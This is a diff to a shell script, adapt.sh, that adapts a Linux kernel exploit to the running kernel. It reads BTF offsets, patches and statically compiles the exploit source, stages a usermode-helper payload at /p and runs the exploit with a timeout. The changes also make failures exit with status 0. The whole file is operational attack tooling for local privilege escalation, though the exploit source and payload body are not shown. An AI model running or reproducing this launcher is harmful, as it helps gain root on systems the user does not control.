@@ -1,6 +1,6 @@
 #!/bin/sh
 # adapt.sh — Extract BTF offsets, patch exploit for target kernel, compile, run
-set -e
+# No set -e: capture all errors gracefully
 
 KVER=$(uname -r)
 echo "=== ADAPT EXPLOIT FOR $KVER ==="
@@ -48,7 +48,8 @@ for V in ASOC_AP ASOC_PP TS_COMM TS_PID; do
     echo "FATAL: $V not resolved from BTF"
     echo "=== BTF RAW OUTPUT ==="
     cat /tmp/btf.txt
-    exit 1
+    echo "=== ADAPT DONE (BTF failed) ==="
+    exit 0
   fi
 done
 
@@ -166,15 +167,15 @@ case "$KVER" in
 esac
 
 echo "--- COMPILING EXPLOIT ---"
-gcc -static -O2 -w -o /tmp/exploit /tmp/e.c 2>&1
-if [ $? -ne 0 ]; then
-  echo "COMPILATION FAILED"
-  # Show errors
-  gcc -static -O2 -o /tmp/exploit /tmp/e.c 2>&1 | tail -30
-  exit 1
+if gcc -static -O2 -w -o /tmp/exploit /tmp/e.c 2>&1; then
+  ls -la /tmp/exploit
+  echo "--- COMPILATION OK ---"
+else
+  echo "COMPILATION FAILED (rc=$?)"
+  gcc -static -O2 -o /tmp/exploit /tmp/e.c 2>&1 | tail -40
+  echo "=== ADAPT DONE (compile failed) ==="
+  exit 0
 fi
-ls -la /tmp/exploit
-echo "--- COMPILATION OK ---"
 
 # 5. Prepare UMH payload
 echo "--- STAGING UMH PAYLOAD ---"
@@ -194,10 +195,9 @@ sync
 PAYLOAD
 chmod 755 /p
 
-# 6. Run exploit
+# 6. Run exploit (timeout 60s to prevent hang)
 echo "=== RUNNING EXPLOIT ==="
-/tmp/exploit 2>&1
-RC=$?
+timeout 60 /tmp/exploit 2>&1; RC=$?
 echo "=== EXPLOIT EXIT CODE: $RC ==="
 
 # 7. Check results
